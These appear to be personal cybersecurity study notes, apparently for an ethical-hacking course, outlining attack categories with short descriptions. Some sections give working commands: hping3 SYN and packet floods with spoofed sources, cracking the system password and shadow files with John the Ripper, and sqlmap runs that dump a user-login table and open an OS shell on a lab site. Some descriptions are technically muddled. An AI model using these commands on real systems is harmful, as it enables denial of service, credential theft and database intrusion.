Attack = motive + method + vulnerability
## Types
### Passive
### Active
Man in the middle
### Close-in attack
Sufring, dumpster diving

Insider attacks
Distribution attacks
Clearing attacks


# Reconnaissance Attacks
Network scanning
DNS Footprinting
Packet sniffing
Man-in-the-middle

DNS Poisoning
Domain hijacking
## ARP Spoofing attack
Layer2 atttack
poisonning router

DHCP Starvation attack
DHCP Spoofing Attach
MAC Spoofing/Duplicating/Cloning
## MAC Flooding
Flooods CAM Table
Makes switches behave like hubs, 
Which allows attacker to see all the packets send through all machines
## IP Address spoofing
```
Hping3 www.certifiedhacker.com -a 7.7.7.7
```


## Denial of Service  / Distributed Denial of Service
botnets
Command & Control channel

## Distributed Reflection Denial of Service DRDoS Attack

## Advanced Persistent Threats APT

## Physical Attack
Keystroke injection circuitry

## Adversarial Artificial Intelligence AI
Mislead ML Models

## Injection Flaws


## Cross-Site SCripting XSS Attacks


## URL Parameter tampering attacks

## Directory Traversal attack

## Cross-Site Request Forgery Attack CSRF

## DNS Amplification Attack

## DoS Attack 
Application-Level 
### SYN Flooding
Sends SYN packets spoofing another machine by continually sending SYN connection request packets.
```bash
hping3 -S 10.10.12 -a 10.10.19 -p 22 --flood
```
### Ping Of Death

Sends an overflow of ping SYN packets size above 65535 bytes, which halts the machine and makes it stop working
```bash
# Attacking a web server
hping3 -d 65538 -S -p 21 --flood 10.10.1.16 
```


## XML External Entity XXE Injection

## Watering hole attack

## Application Level session Hijacking Sesson Replay Attack

## API Attacks

## Secure Sockets Layer (SSL) Stripping - SSL Downgrading

## Malicious code or Script execution
Powershell
Python

## Network cracking
Using wpa2 network
```bash

```
## Password cracking
### John the ripper
```bash
unshadow /etc/passwd /etc/shadow > target-file
john --wordlist=/home/attacker/Desktop/WordLists/password.txt target-file
```


Dictionary
Brute-force
Rule-based attack

## Hash injection - pass the hash attack PtH

## Rainbow table attack
Rainbow table  = precomputed table

## Buffer overflow
adjacent memory in c++ memory heap
## Privilege escalation
gaining access thgough non-admin user

Horizontal privilege escaletion
Vertical privilege escalation

## DLL Hijacking injection
Robber
PowerSploit

## Driver manipulation
Refactoring
Application shimming

## Web parameter tampering
Taking advantage of API requests with security vulnerabilities done by developers

Using burpsuite for this attack

## [[Social engineering]]
```setoolkit

```

## SQL Injection
Injects malicious SQL queries into the user inpot

It is possible to get from a web page the cookie by going to the developer mode in a browser and typing in the console mode:
```javascript
document.cookie
```

The following command can be run to inject sql
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=<value> ui-tabs-1=0" --dbs
```
```bash
# Retrieve tables from a discovered database
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=<value> ui-tabs-1=0" -D moviescope --tables

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=<value> ui-tabs-1=0" -D moviescope -T User_Login --dump

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=<value> ui-tabs-1=0" --os-shell


```
## Wireless network specific attacks

### Rogue Access Point attack 
Legitimate IP 

### AP MAC Spoofing
Gain unauthorized access to network where MAC address is required

### Evil twin
Mirror wireless connection

### Bluetooth
Bluesmacking
### RFID

### NFC

### Mobile SPAM
Phising over SMS

#### Hacking an android device using metasploit
can be used to create payloads 



## IoT

SDR Software defined radios 

Side-Channel attack or Cross-guest VM breaches

## Main in the cloud attack (MITC) Attack

## Cloud hopper attack
Attack the insiders legitimate employers of the cloud service

## Supply chain
Attack manufacturing

## Exploiting miscofigured AWS S3 Buckets


# Cryptography attacks
Known plaintext
Chosen ciphertext
Rubber hose
Chosen key
Tming Attack
Man-in-the-middle

# Birthday
name used to refer to a class of brute-force
likability of two words having the same hash
